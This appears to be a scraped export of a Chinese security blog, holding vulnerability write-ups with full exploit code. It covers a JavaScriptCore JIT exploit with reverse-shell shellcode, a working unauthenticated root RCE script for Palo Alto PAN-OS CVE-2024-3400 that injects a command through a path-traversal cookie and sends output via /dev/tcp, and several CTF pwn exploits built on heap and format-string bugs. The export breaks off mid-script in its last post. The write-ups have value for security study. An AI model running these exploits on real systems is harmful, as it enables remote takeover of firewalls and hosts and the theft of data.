函数的调用链来实现任意地址读数据，主要就是伪造调用链中的结构，最终使得identifier指向需要泄露的地址处，然后使用Function.prototype.toString.call获得任意地址处的数据，可参考文章\nfunction leak_structureID2(obj) &#123;    // https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf    var unlinkedFunctionExecutable = &#123;        m_isBuitinFunction: i2f(0xdeadbeef),        pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6,        m_identifier: &#123;&#125;,    &#125;;    var fakeFunctionExecutable = &#123;      pad0: 0, pad1: 1, pad2: 2, pad3: 3, pad4: 4, pad5: 5, pad6: 6, pad7: 7, pad8: 8,      m_executable: unlinkedFunctionExecutable,    &#125;;    var container = &#123;      jscell: i2f(0x00001a0000000000),      butterfly: &#123;&#125;,      pad: 0,      m_functionExecutable: fakeFunctionExecutable,    &#125;;    let fakeObjAddr = addressOf(container);    let fakeObj = fakeObject(fakeObjAddr[0] + 0x10,fakeObjAddr[1]);    unlinkedFunctionExecutable.m_identifier = fakeObj;    container.butterfly = obj;    var nameStr = Function.prototype.toString.call(fakeObj);    let structureID = nameStr.charCodeAt(9);    // repair the fakeObj&#x27;s jscell    u32[0] = structureID;    u32[1] = 0x01082309-0x20000;    container.jscell = f64[0];    return structureID;&#125;\n任意地址读写原语在泄露了StructureID以后，就可以伪造数组对象进行任意地址读写了\nvar structureID = leak_structureID2(arr_leak);u32[0] = structureID;u32[1] = 0x01082309-0x20000;//debug(describe(arr_leak));debug(&#x27;[+] structureID=&#x27; + structureID);var victim = [1.1,2.2,3.3];victim[&#x27;prop&#x27;] = 23.33;var container = &#123;   jscell:f64[0],   butterfly:victim&#125;var container_addr = addressOf(container);var hax = fakeObject(container_addr[0]+0x10,container_addr[1]);var padding = [1.1,2.2,3.3,4.4];var unboxed = [noCow,2.2,3.3];var boxed = [&#123;&#125;];/*debug(describe(unboxed));debug(describe(boxed));debug(describe(victim));debug(describe(hax));*/hax[1] = unboxed;var sharedButterfly = victim[1];hax[1] = boxed;victim[1] = sharedButterfly;function NewAddressOf(obj) &#123;   boxed[0] = obj;   return u64f(unboxed[0]);&#125;function NewFakeObject(addr_l,addr_h) &#123;   var addr = p64f(addr_l,addr_h);   unboxed[0] = addr;   return boxed[0];&#125;function read64(addr_l,addr_h) &#123;   //必须保证在vicim[-1]处有数据，即used slots和max slots字段，否则将导致读取失败   //因此我们换用另一种方法，即利用property去访问   hax[1] = NewFakeObject(addr_l + 0x10,addr_h);   return NewAddressOf(victim.prop);&#125;function write64(addr_l,addr_h,double_val) &#123;   hax[1] = NewFakeObject(addr_l + 0x10,addr_h);   victim.prop = double_val;&#125;\n劫持JIT编译的代码var shellcodeFunc = getJITFunction();shellcodeFunc();var shellcodeFunc_addr = NewAddressOf(shellcodeFunc);var executable_base_addr = read64(shellcodeFunc_addr[0] + 0x18,shellcodeFunc_addr[1]);var jit_code_addr = read64(executable_base_addr[0] + 0x8,executable_base_addr[1]);var rwx_addr = read64(jit_code_addr[0] + 0x20,jit_code_addr[1]);debug(&quot;[+] shellcodeFunc_addr=&quot; + shellcodeFunc_addr[1].toString(16) + shellcodeFunc_addr[0].toString(16));debug(&quot;[+] executable_base_addr=&quot; + executable_base_addr[1].toString(16) + executable_base_addr[0].toString(16));debug(&quot;[+] jit_code_addr=&quot; + jit_code_addr[1].toString(16) + jit_code_addr[0].toString(16));debug(&quot;[+] rwx_addr=&quot; + rwx_addr[1].toString(16) + rwx_addr[0].toString(16));const shellcode = [\t0x31, 0xD2, 0x31, 0xF6, 0x40, 0xB6, 0x01, 0x31, 0xFF, 0x40, 0xB7, 0x02, 0x31, 0xC0, 0xB0, 0x29,\t0x0F, 0x05, 0x89, 0x44, 0x24, 0xF8, 0x89, 0xC7, 0x48, 0xB8, 0x02, 0x00, 0x09, 0x1D, 0x7F, 0x00,\t0x00, 0x01, 0x48, 0x89, 0x04, 0x24, 0x48, 0x89, 0xE6, 0xB2, 0x10, 0x48, 0x31, 0xC0, 0xB0, 0x2A,\t0x0F, 0x05, 0x8B, 0x7C, 0x24, 0xF8, 0x31, 0xF6, 0xB0, 0x21, 0x0F, 0x05, 0x40, 0xB6, 0x01, 0x8B,\t0x7C, 0x24, 0xF8, 0xB0, 0x21, 0x0F, 0x05, 0x40, 0xB6, 0x02, 0x8B, 0x7C, 0x24, 0xF8, 0xB0, 0x21,\t0x0F, 0x05, 0x48, 0xB8, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x48, 0x89, 0x44, 0x24,\t0xF0, 0x48, 0x31, 0xF6, 0x48, 0x31, 0xD2, 0x48, 0x8D, 0x7C, 0x24, 0xF0, 0x48, 0x31, 0xC0, 0xB0,\t0x3B, 0x0F, 0x05];function ByteToDwordArray(payload)&#123;    let sc = []    let tmp = 0;    let len = Math.ceil(payload.length/6)    for (let i = 0; i &lt; len; i += 1) &#123;        tmp = 0;        pow = 1;        for(let j=0; j&lt;6; j++)&#123;            let c = payload[i*6+j]            if(c === undefined) &#123;                c = 0;            &#125;            pow = j==0 ? 1 : 256 * pow;            tmp += c * pow;        &#125;        tmp += 0xc000000000000;        sc.push(tmp);    &#125;    return sc;&#125;//debug(describe(shellcodeFunc));//debug(shellcode.length);//替换jit的shellcodelet sc = ByteToDwordArray(shellcode);for(let i=0; i&lt;sc.length; i++) &#123;   write64(rwx_addr[0] + i*6,rwx_addr[1],i2f(sc[i]));&#125;debug(&quot;trigger shellcode&quot;)//执行shellcodeprint();shellcodeFunc();print();\n这里，我们使用ByteToDwordArray将shellcode转为6字节有效数据每个的数组，这样是为了在write64时能一次写入6个有效数据，减少for(let i=0; i&lt;sc.length; i++)的次数，避免write64被JIT编译，否则会报错崩溃，原因是因为我们伪造的对象未通过编译时的某些检查，但这不影响我们漏洞利用。结果展示\n0x03 感想通过本次研究学习，理解了JSC的边界检查消除机制，同时也对JSC中的CSE有了一些了解，其与V8之间也非常的相似。\n0x04 参考FireShell2020——从一道ctf题入门jsc利用WebKit Commitdiffeu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-MethodsJITSploitation I：JIT编译器漏洞分析 Project Zero: JITSploitation I: A JIT Bug\n","categories":["CTF","安全研究","CVE"],"tags":["JS引擎漏洞","类型混淆"]},{"title":"Palo Alto CVE-2024-3400漏洞分析","url":"/2024/04/18/CVE-2024-3400/","content":"前言全球著名防火墙公司Palo Alto Networks近日在官网公布了一个CVE-2024-3400的漏洞信息，该漏洞存在于部分PAN-OS系统的GlobalProtect功能中，在某些配置打开的情况下，攻击者可以对运行该系统的设备进行未授权RCE，并且拿到系统的root权限，本文以研究学习为目的对漏洞的成因进行详细的分析。\n影响版本根据官网提供的信息，我们选取了PAN-OS 11.0.0版本固件作为本文的研究对象。\n\n\nGlobalProtect分析GlobalProtect是PAN-OS中的VPN组件，可以在管理端配置GlobalProtect Portal门户页面，其页面如下，可供VPN用户进行登录\n\n对固件进行解包，在/etc/nginx/sslvpn中发现了GlobalProtect Portal的服务器配置文件，查看location.conf文件，可以知道VPN的API请求直接被代理到了内部的20177端口\n\n通过查看端口占有情况，可知VPN请求由gpsvc程序进行处理\n\n\ngpsvc逆向分析gpsvc使用golang语言编写，分析HTTP服务的调用链net_http__ptr_conn_serve-&gt;net_http_serverHandler_ServeHTTP-&gt;github_com_gorilla_mux__ptr_Router_ServeHTTP-&gt;net_http_HandlerFunc_ServeHTT-&gt;main__ptr_GpTaskMgmt_MainHttpEntry-&gt;main__ptr_GpTask_RunHttp-&gt;main__ptr_GpTask_initHttp其中main__ptr_GpTask_initHttp函数会解析请求数据包，审计该函数，注意到此处是对Cookie中的SESSID字段的处理\n\n在此处下断点并追踪对SESSID的处理，最终会来到main__ptr_SessDiskStore_New函数，\n\n分析该函数的代码，其中name就是传入的SESSID，调用net_http__ptr_Request_Cookie从Cookie中获取SESSID的值，然后赋值给session-&gt;ID.str\n\n接下来会将session-&gt;ID.str进行简单的路径拼接，得到filename完整路径，然后传递给main_loadSessFile\n\n我们直接在main_loadSessFile下断点，然后调试，使用如下的测试脚本进行触发\nfrom pwn import *import osimport requestsip = &#x27;192.168.177.149&#x27;port = 20077payload = &#x27;POST /ssl-vpn/hipreport.esp HTTP/1.1\\r\\n&#x27;payload += &#x27;Host: aa.bb.cc\\r\\n&#x27;payload += &#x27;Cookie: SESSID=/aaaaaaaaaaaaa;\\r\\n&#x27;payload += &#x27;\\r\\n&#x27;sh = remote(ip,port)sh.send(payload)sh.interactive()\n\n可以看到SESSID的内容成功拼接到filename，由于是简单的拼接，能否尝试一下/../../这种路径穿越的path?修改测试脚本\n#coding:utf8from pwn import *import osimport requestsip = &#x27;192.168.177.149&#x27;port = 20077payload = &#x27;POST /ssl-vpn/hipreport.esp HTTP/1.1\\r\\n&#x27;payload += &#x27;Host: aa.bb.cc\\r\\n&#x27;payload += &#x27;Cookie: SESSID=/../../../tmp/aaaaaaaaaaaaa;\\r\\n&#x27;payload += &#x27;\\r\\n&#x27;sh = remote(ip,port)sh.send(payload)sh.interactive()\n可以看到，/../../../被path_filepath_Join函数处理后，前缀的文件夹路径被成功消除了\n\n这意味着我们可以对main_loadSessFile函数指定任意路径的filename参数。这可以做什么？分析main_loadSessFile函数，其中有一条调用链main_loadSessFile(filename)-&gt;main_fileLock(filename)-&gt;syscall_Open(filename, 0x40LL, 0x180u)\n\n注意到第二个参数0x40，这是O_CREAT的值，这意味着如果文件不存在，则会创建文件，由于filename可以被任意控制，意味着可以在系统的任何地方创建一个文件，且文件名任意指定。查看刚才测试的脚本执行后，在&#x2F;tmp目录下查看，确实生成了/tmp/aaaaaaaaaaaaa文件\n\n\n漏洞利用分析-telemetry漏洞可以让我们在系统任何目录创建一个文件名可控的文件，如何结合到命令注入中？telemetry是系统中的一个数据收集服务，一般在首次配置时会弹出是否开启此功能的提示框\n\n其状态可以在Device-&gt;Setup标签下查看，要开启，还需要配置好Device Certificate\n\n在固件中分析，telemetry在/etc/cron.d中有许多telemetry的定时任务文件\n\n这些定时任务会定期运行，其中device_telemetry_send就是负责发送数据的任务，可以看到，/usr/local/bin/dt_send以root权限运行\n\n分析dt_send，该程序是python写的，主函数调用了check_and_send()函数\n\n继续分析check_and_send()函数，send_file_dirs_all()会被调用\n\nsend_file_dirs_all会调用send_file_dir，在该函数中，首先列出目录下所有文件名，然后一个个的传递给send_file进行发送。\n\nsend_file代码如下，将filename拼接到命令行中，然后调用techsupport.dosys，经过测试，techsupport.dosys函数并不支持命令注入\n\n继续跟踪进入dt_curl脚本的代码，该脚本中send_file同样也使用了命令行拼接，但是在pansys执行时有一个参数shell=True，有了这个参数，整个命令行字符串会交给bash进行解释，这意味着这里可以进行命令注入。\n\n\n思路梳理由于gpsvc可以在任意目录创建文件，且文件名可控，我们可以在dt_send脚本遍历发送数据的目录下写入一个带命令注入文件名的文件，经过分析，dt_send会遍历/opt/panlogs/tmp/device_telemetry/minute目录，当dt_send调用send_file_dir时就能够遍历到我们创建的文件，并把文件名传递到dt_curl中的send_file，造成命令注入，由于dt_send以root执行，我们注入的命令也将是root权限的。需要注意的是，dt_send可能需要等待5分钟或者20分钟甚至更久，才会发送一次数据，因此我们使用漏洞在目录下创建注入文件后，需要等待一段时间，命令才会被执行。\nEXP#coding:utf8from pwn import *import osimport requestsip = &#x27;aaaaa&#x27;port = xxxxdef escape(data):   ans = &#x27;&#x27;   for x in data:      if x == &#x27; &#x27;:         ans += &#x27;$&#123;IFS&#125;&#x27;      elif x == &#x27;/&#x27;:         ans += &#x27;$&#123;PATH:0:1&#125;&#x27;      else:         ans += x   return anscmd = &#x27;ls / &gt;/dev/tcp/192.168.177.1/2333&#x27;payload = &#x27;POST /ssl-vpn/hipreport.esp HTTP/1.1\\r\\n&#x27;payload += &#x27;Host: aa.bb.cc\\r\\n&#x27;payload += &#x27;Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/t`%s`;\\r\\n&#x27; % escape(cmd)payload += &#x27;\\r\\n&#x27;sh = remote(ip,port)sh.send(payload)print(&#x27;wait 5.5 minutes...&#x27;)sleep(int(5.5*60))sh.close()\n\n修复建议目前官方已经发布了更新版本\nSolutionWe strongly advise customers to immediately upgrade to a fixed version of PAN-OS to protect their devices even when workarounds and mitigations have been applied.This issue is fixed in PAN-OS 10.2.9-h1, PAN-OS 11.0.4-h1, PAN-OS 11.1.2-h3, and in all later PAN-OS versions. Customers who upgrade to these versions will be fully protected.In addition, to provide the most seamless upgrade path for customers, additional hotfixes are being made available as a courtesy for other commonly deployed maintenance releases and will also be made available to address this issue. Customers do not have to wait for these hotfixes.PAN-OS 10.2:- 10.2.9-h1 (Released 4/14/24)- 10.2.8-h3 (Released 4/15/24)- 10.2.7-h8 (Released 4/15/24)- 10.2.6-h3 (Released 4/16/24)- 10.2.5-h6 (Released 4/16/24)- 10.2.3-h13 (ETA: 4/17/24)- 10.2.1-h2 (ETA: 4/17/24)- 10.2.2-h5 (ETA: 4/18/24)- 10.2.0-h3 (ETA: 4/18/24)- 10.2.4-h16 (ETA: 4/19/24)PAN-OS 11.0:- 11.0.4-h1 (Released 4/14/24)- 11.0.4-h2 (Released 4/17/24)- 11.0.3-h10 (Released 4/16/24)- 11.0.2-h4 (Released 4/16/24)- 11.0.1-h4 (ETA: 4/17/24)- 11.0.0-h3 (ETA: 4/18/24)PAN-OS 11.1:- 11.1.2-h3 (Released 4/14/24)- 11.1.1-h1 (Released 4/16/24)- 11.1.0-h3 (Released 4/16/24)\n\n参考CVE-2024-3400 PAN-OS: OS Command Injection Vulnerability in GlobalProtectPalo Alto - Putting The Protecc In GlobalProtect (CVE-2024-3400)Palo Alto OS Command Injection\n","categories":["安全研究","CVE"],"tags":["路径穿越","命令注入"]},{"title":"DawgCTF2020_tiktok","url":"/2020/04/14/DawgCTF2020_tiktok/","content":"这是DawgCTF 2020国际赛的一题，作为一血所得者，还是很高兴的。\n首先，检查一下程序的保护机制，发现没开PIE\n\n\n然后，我们用IDA分析一下,import_song函数打开文件描述符，然后存储在路径的后面那个空间\n\n\nPlay_song函数从打开的文件描述符里读取数据,申请的堆大小为nbytes+1,然后从文件里读取数据存入堆里，并打印出来。\n\n\nRemove_song函数清除该歌曲的信息\n\n\n第一个漏洞点在于play_song函数里存在一个整数符号的问题\n\n\nnbytes为有符号数据，因此成功nbytes的值为-1，0那么buf &#x3D; malloc(0)，而read则是read(fd,buf,-1);由此造成了堆溢出。然而，fd是已经存在的文件的文件描述符，显然nbytes不能直接被控制,read的内容也不能直接控制。因此，还需要第二个漏洞才可以完成利用。\n\n\n通过调试，我们可以知道，文件描述符fd存储在songs后面。\n\n\n\n\n而strtok会以指定的字符来分隔字符串，[其分隔原理就是将指定的字符替换为0。]{.mark}\n最开始用户可以输入长度为0x18的文件名，而songs+0x18正好是fd的位置。\n\n\n如果，我们的文件名里不包含.号，而fd的值正好为46的时候，由于字符串以0结尾，所以fd也被算入字符串里,strtok(0,’.’)就会将fd设置为0，因为46对应的ascii字符为.号。而**[当fd被设置为0的时候，我们就可以利用第一个漏洞来溢出堆了。]{.mark}**\n[Linux 下fd总是依次递增的，因此，我们需要先import_song n次，使得fd正好为46]{.mark}。然后playsongs的时候，就可以从终端输入数据，进而溢出堆。由于glibc版本为2.27，因此可以直接伪造next指针，实现任意地址分配。由于没有开启PIE，我们分配到songs数组里，控制songs数组，即可实现任意地址读，泄露地址后，再次伪造next指针分配到free_hook处，写入system地址，触发即可。\n#coding:utf8from pwn import *libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)system_s = libc.sym[&#x27;system&#x27;]elf = ELF(&#x27;./tiktok&#x27;)system_got = elf.got[&#x27;system&#x27;]songs = elf.symbols[&#x27;songs&#x27;]#sh = process(&#x27;./tiktok&#x27;)sh = remote(&#x27;ctf.umbccd.io&#x27;,4700)def open_fd(path):   sh.sendlineafter(&#x27;Choice:&#x27;,&#x27;1&#x27;)   sh.sendlineafter(&#x27;path.&#x27;,path)def add(index,size = 0,content = &#x27;&#x27;):   sh.sendlineafter(&#x27;Choice:&#x27;,&#x27;3&#x27;)   sh.sendlineafter(&#x27;Choice:&#x27;,str(index))   if size != 0:      sh.sendline(str(size).ljust(0x4,&#x27;\\x00&#x27;))      sh.send(content)def delete(index):   sh.sendlineafter(&#x27;Choice:&#x27;,&#x27;4&#x27;)   sh.sendlineafter(&#x27;Choice:&#x27;,str(index))#1open_fd(&#x27;Rainbow/godzilla.txt&#x27;)#2open_fd(&#x27;Rainbow/godzilla.txt&#x27;)#3open_fd(&#x27;Rainbow/godzilla.txt&#x27;)#使得文件描述符递增到45for i in range(40):   print i   open_fd(&#x27;Warrior/&#x27;)#文件描述符为46,46对应ascii字符.号，会被strtok置0，从而使得我们可以指定size，进而溢出堆open_fd(&#x27;Warrior&#x27;.ljust(0x18,&#x27;/&#x27;))add(4)add(5)add(2)add(6)add(7)add(8)add(9)add(42)add(43)delete(2)delete(6)delete(5)delete(4)#溢出，修改tcache的next指针指向songs+0x18，当申请到songs+0x18时，songs+0x18处会被置0#而songs+0x18处对应的是1的fdadd(44,-1,&#x27;a&#x27;*0x10 + p64(0) + p64(0x21) + p64(songs+0x18) + &#x27;a&#x27;*8 + p64(0) + p64(0x311) + p64(songs+0x38))add(10)add(11) #这里将导致songs+0x18处置零add(3) #取出0x310的第一个chunk#分配到songs+0x38，控制整个songs结构体数组#2fake_struct = p64(0)*3 + p64(4)fake_struct += p64(songs) + p64(songs+0x8)fake_struct += p64(system_got)#3fake_struct += p64(0)*3 + p64(0) #fd设置为0fake_struct += p64(songs) + p64(songs+0x8)fake_struct += p64(0)#4fake_struct += p64(0)*3 + p64(0) #fd设置为0fake_struct += p64(songs) + p64(songs+0x8)fake_struct += p64(0)#5fake_struct += p64(0)*3 + p64(0) #fd设置为0fake_struct += p64(songs) + p64(songs+0x8)fake_struct += p64(0)add(1,768,fake_struct) #分配到songs+0x38#泄露setvbuf的地址add(2)sh.recvuntil(&#x27;\\n&#x27;)system_addr = u64(sh.recv(6).ljust(8,&#x27;\\x00&#x27;))libc_base = system_addr - system_sfree_hook_addr = libc_base + libc.symbols[&#x27;__free_hook&#x27;]print &#x27;libc_base=&#x27;,hex(libc_base)print &#x27;system_addr=&#x27;,hex(system_addr)print &#x27;free_hook_addr=&#x27;,hex(free_hook_addr)#向tcache bin里放两个0x20的chunkdelete(43)delete(42)#将42代表的chunk申请到3,这样可以和前面一样的道理来溢出，修改43的next指针add(3,-1,&#x27;/bin/sh&#x27;.ljust(0x10,&#x27;\\x00&#x27;) + p64(0) + p64(0x21) + p64(free_hook_addr))add(4,-1,&#x27;a&#x27;)#写free_hookadd(5,-1,p64(system_addr))#getshelldelete(3)sh.interactive()","categories":["CTF"],"tags":["堆溢出","变量覆盖","strtok","glibc 2.27"]},{"title":"De1CTF-2020-stl-container(C++ Vector漏洞)","url":"/2020/06/10/De1CTF-2020-stl-container/","content":"C++的vector的erase函数实现如下\niterator erase(iterator position)&#123;    if (position + 1 != end())    &#123;        // 把从 position+1 到 finish 之间的元素一个一个复制到从 position 指向        //的空间，这样，就把 position 原来指向的元素个覆盖了        copy(position + 1, finish, position);    &#125;    --finish;    destroy(finish);    return position;&#125;\n就是将position+1 到 finish 之间的元素一个一个复制到从 position 指向的空间，这样，就把 position 原来指向的元素个覆盖了。同时注意到destroy(finish);释放最后一个元素，因此position位置的元素不会被释放，最后一个元素会被释放造成UAF。\n//假设有如下的一个列表，其内存空间表示如下: //--------------------------------------------------------- //| 1 | 2 | 3 | 4 | 5 |  |  | //--------------------------------------------------------- //           | //                  finish //现在，要删除第二个元素 2 这个对象。 //所以，执行 copy 之后，把 3， 4， 5 对象往前移动，其内存空间如下: //--------------------------------------------------------- //| 1 | 3 | 4 | 5 | 5 |  |  | //--------------------------------------------------------- //           | //                 finish //注意，第 5 个元素的内存空间还是原来的对象 5 这个对象。 //然后，执行 --finish; 操作，移动指针，如下: //--------------------------------------------------------- //| 1 | 3 | 4 | 5 | 5 |  |  | //--------------------------------------------------------- //         | //               finish   //然后，执行 destroy(finish); 操作，执行的是第 5 个元素的析构函数，而 //我们删除的第2个对象，并没有执行其析构函数，只是把它在内存空间给覆盖了。\n\n","categories":["CTF"],"tags":["UAF","C++ vector"]},{"title":"WHCTF2017-EasyPwn","url":"/2019/11/15/EasyPwn/","content":"首先，看一下程序的保护机制\n\n\n开启了CANARY、NX和PIE，RELRO部分开启，我们可以改写GOT表\n然后，我们用IDA分析\n\n\nread的maxsize参数比变量的空间大小要小，因此无法溢出到栈底，加上开启了PIE，因此排除了ROP的方法\n我们再仔细观察一下，发现snprintf在执行的过程中，v2可以溢出到v3，而v3存储的是格式化字符串，因此，我们可以溢出v2，修改格式化字符串，达到任意地址的读写。\n\n\n我们再看看主函数，\n\n\n我们可以利用snprintf格式化字符串漏洞，修改free的GOT表，让它指向system，然后我们第二次输入&#x2F;bin&#x2F;sh字符串，那么&#x2F;bin&#x2F;sh会存到堆里，当调用free(buf)，时，就相当于执行了system(binsh_addr)，我们就能getshell。\n修改free的GOT表时，也有技巧，我们可以只修改后4字节数据，因此free和system在libc中的位置偏差也就那么多，那么它们在内存中的地址，也就最后几字节不一样，我们只需覆盖最后几字节数据即可。这也叫pritiawrite技术。\n那么我们首先得让free的GOT表中的地址加载好，那么我们得先调用一次free。\n#这一步是为了让free的GOT表内容加载  sh.sendlineafter(&#x27;Input Your Code:n&#x27;,&#x27;2&#x27;)  sh.sendlineafter(&#x27;Input Your Name:n&#x27;,&#x27;test&#x27;)  \n\n接下来，我们就可以开启啦。\n由于开启了PIE,我们得先利用snprintf泄露一些地址。\n\n\n在我们进入功能1函数前，我们看到栈里有一个__libc_start_main+F0的地址，我们可以利用snprintf把它的值暴露出来。\n为什么能够工作？(%s不是在snprintf执行时就传入了吗，%s如果变化了，按理来说不影响snprintf啊)\n经过不断的调试，发现，[snprintf把格式化字符串的地址记下来，然后，每次要处理一个字符时，先从地址处取格式化字符串，然后再根据格式化字符串来处理字符。由于地址是没变的，变的是地址里面的内容。]{.mark}\nsh.sendlineafter(&#x27;Input Your Code:n&#x27;,&#x27;1&#x27;)  #泄露__libc_start_main+F0的地址  payload = &#x27;a&#x27;*(0x3E8)+&#x27;bb%397$p&#x27;  sh.sendafter(&#x27;Welcome To WHCTF2017:n&#x27;,payload)  sh.recvuntil(&#x27;0x&#x27;)  __libc_start_main = int(sh.recvuntil(&#x27;n&#x27;),16) - 0xF0  \n\n这里，解释一下payload，前面0x3E0x7F0(v3位置-0x408(v2位置)\n注意，接下来的两个字符bb是重要的(不能是aa,即不能与前面的那0x3E8个字符一样，不知道为什么，其他的都可以，有知道的大佬欢迎留言)，这是为了覆盖原先的%s，根据上面说的snprintf工作过程，snprintf处理前面0x3E8个字符时，用的都是%s来格式化，当处理第一个b时,此时b已经覆盖了%号，格式化字符串变为bs，当处理第二个b时，此时b覆盖了字符s，格式化字符串变成bb。接下来,%397$p被原模原样的覆盖到了bb的后面，也就是最后，格式化字符串变成了bb%397$p，当snprintf读到格式化字符串为bb%397$p，变打印了bb0x[第397个元素的值]\n%397$p就是距栈底397个位置的数据(也就是__libc_start_main+F0)，这是如何得到的？\n\n\n如图，在我们跟踪进入snprintf函数以后，并且还**[未对rsp做调整]{.mark}**时，栈顶rsp为0x7FFD176702D0，然后我们找到__libc_start_main+F0在栈里的位置,为0x7FFD17670F38\n\n\n那么\n(0x7FFD17670F–0x7FFD176702D397\n我们利用同样的方法泄露init的地址\n\n\n那么，现在我们就能计算出程序的加载基地址和libc的加载基地址了\nlibc = LibcSearcher(&#x27;__libc_start_main&#x27;,__libc_start_main)  #获得libc加载基地址  libc_base = __libc_start_main - libc.dump(&#x27;__libc_start_main&#x27;)  system_addr = libc_base + libc.dump(&#x27;system&#x27;)  print &#x27;system addr=&#x27;,hex(system_addr)  sh.sendlineafter(&#x27;Input Your Code:n&#x27;,&#x27;1&#x27;)  #泄露init的地址  payload = &#x27;a&#x27;*(0x3E8)+&#x27;bb%396$p&#x27;  sh.sendafter(&#x27;Welcome To WHCTF2017:n&#x27;,payload)  sh.recvuntil(&#x27;0x&#x27;)  init_addr = int(sh.recvuntil(&#x27;n&#x27;),16)  #获得程序的加载基地址,0xDA0为init在二进制文件中的静态地址  elf_base = init_addr - 0xDA0  \n\n然后，我们得到了基地址，我们就能得到free的GOT表地址和system的地址。\n然后，我们该如何来修改free的GOT表呢？\n首先，我们不能把p64(addr)放格式化字符串的前面，因为p64(addr)里面有0，会导致snprintf遇到0后就结束，不能读取到我们后来的格式化字符串。\n所以必须放后面，类似于这样\n;  payload =  &#x27;a&#x27;*(0x3E8) + (&#x27;bb%&#x27; + str(data - 0x3FE) + &#x27;c%133$hn&#x27;).ljust(16,&#x27;a&#x27;) + p64(free_addr + 2)  \n\n其中，**%133$hn代表把距栈顶133个位置处的数据当成地址，往那个地址处写一个值，hn表示写一个WORD（字）的数据，也就是2字节数据，并且值表示在这之前,snprintf已经打印了多少个字符,**具体可以去学习一下字符串格式化漏洞的相关知识。\nljust(16,’a’)是为了凑出16字节，格式化字符串可能超过8字节，但不会超过16字节，并且，由于要8字节对齐，所以需要补足。\n这个133是如何得到的？\n\n\n当进入snprintf，当还没变更rsp时，rsp栈顶为0x7FFF4D0A1BE0，然后我们看到我们输入的数据是从7FFF4D0A1C10开始的\n\n\n于是公式为\n(7FFF4D0A1C0x7FFF4D0A1BE(0x3E133\n那么，我们最终写出exp脚本如下\n#coding:utf8  from pwn import *  from LibcSearcher import *    #context(log_level=&#x27;debug&#x27;)  sh = process(&#x27;./pwn1&#x27;)  #sh = remote(&#x27;111.198.29.45&#x27;,43257)  elf = ELF(&#x27;./pwn1&#x27;)    #这一步是为了让free的GOT表内容加载  sh.sendlineafter(&#x27;Input Your Code:\\n&#x27;,&#x27;2&#x27;)  sh.sendlineafter(&#x27;Input Your Name:\\n&#x27;,&#x27;test&#x27;)      sh.sendlineafter(&#x27;Input Your Code:\\n&#x27;,&#x27;1&#x27;)  #泄露__libc_start_main+F0的地址  payload = &#x27;a&#x27;*(0x3E8)+&#x27;bb%397$p&#x27;  sh.sendafter(&#x27;Welcome To WHCTF2017:\\n&#x27;,payload)  sh.recvuntil(&#x27;0x&#x27;)  __libc_start_main = int(sh.recvuntil(&#x27;\\n&#x27;),16) - 0xF0    libc = LibcSearcher(&#x27;__libc_start_main&#x27;,__libc_start_main)  #获得libc加载基地址  libc_base = __libc_start_main - libc.dump(&#x27;__libc_start_main&#x27;)  system_addr = libc_base + libc.dump(&#x27;system&#x27;)  print &#x27;system addr=&#x27;,hex(system_addr)    sh.sendlineafter(&#x27;Input Your Code:\\n&#x27;,&#x27;1&#x27;)  #泄露init的地址  payload = &#x27;a&#x27;*(0x3E8)+&#x27;bb%396$p&#x27;  sh.sendafter(&#x27;Welcome To WHCTF2017:\\n&#x27;,payload)  sh.recvuntil(&#x27;0x&#x27;)    init_addr = int(sh.recvuntil(&#x27;\\n&#x27;),16)  #获得程序的加载基地址,0xDA0为init在二进制文件中的静态地址  elf_base = init_addr - 0xDA0  #free的GOT表地址  free_addr = elf_base + elf.got[&#x27;free&#x27;]    print &#x27;free_addr=&#x27;,hex(free_addr)    #以下两步修改free的GOT表内容，让它指向system  sh.sendlineafter(&#x27;Input Your Code:\\n&#x27;,&#x27;1&#x27;)  #覆写倒数的第3、4字节数据  data = (system_addr &amp; 0xFFFFFFFF) &gt;&gt; 16  #那个百分号前的两个aa是为了凑出8字节  payload =  &#x27;a&#x27;*(0x3E8) + (&#x27;bb%&#x27; + str(data - 0x3FE) + &#x27;c%133$hn&#x27;).ljust(16,&#x27;a&#x27;) + p64(free_addr + 2)  sh.sendafter(&#x27;Welcome To WHCTF2017:\\n&#x27;,payload)    #覆写倒数的2字节数据  data = system_addr &amp; 0xFFFF  sh.sendlineafter(&#x27;Input Your Code:\\n&#x27;,&#x27;1&#x27;)  payload =  &#x27;a&#x27;*(0x3E8) + (&#x27;bb%&#x27; + str(data - 0x3FE) + &#x27;c%133$hn&#x27;).ljust(16,&#x27;a&#x27;) + p64(free_addr)  sh.sendafter(&#x27;Welcome To WHCTF2017:\\n&#x27;,payload)    #getshell  sh.sendlineafter(&#x27;Input Your Code:\\n&#x27;,&#x27;2&#x27;)  sh.sendlineafter(&#x27;Input Your Name:\\n&#x27;,&#x27;/bin/sh&#x27;)    sh.interactive()  ","categories":["CTF"],"tags":["栈溢出","格式化字符串漏洞","partial write bypass PIE"]},{"title":"FireshellCTF2020_Firehttpd","url":"/2020/07/24/FireshellCTF2020_Firehttpd/","content":"首先，检查一下程序的保护机制\n\n\n然后，我们用IDA分析一下，在referer字段的解析里存在格式化字符串漏洞，由于是主进程fork子进程，因此，我们泄露的数据第二次不会改变仍然可以使用。\n\n\n那么，我们利用格式化字符串漏洞，将文件名指针修改指向我们可控的地址，这样就可以读取我们想要的文件了。\n#coding:utf8from pwn import *ip = &#x27;node3.buuoj.cn&#x27;port = 28726sh = remote(ip,port)#泄露文件名的地址payload = &#x27;GET /index.html HTTP/1.1\\r\\n&#x27;payload += &#x27;Referer: %5$p\\r\\n\\r\\n&#x27;sh.send(payload)sh.recvuntil(&#x27;Referer: &#x27;)name_addr = int(sh.recvuntil(&#x27;\\n&#x27;,drop = True),16)print &#x27;name_addr=&#x27;,hex(name_addr)sh.close()sh = remote(ip,port)#修改文件名指针指向我们可控的地方flag_str = name_addr - 0xA98data = &#123;0:0&#125;i = 0flag_str = flag_str &amp; 0xFFFFwhile flag_str &gt;0:   data[i] = flag_str &amp; 0xFF   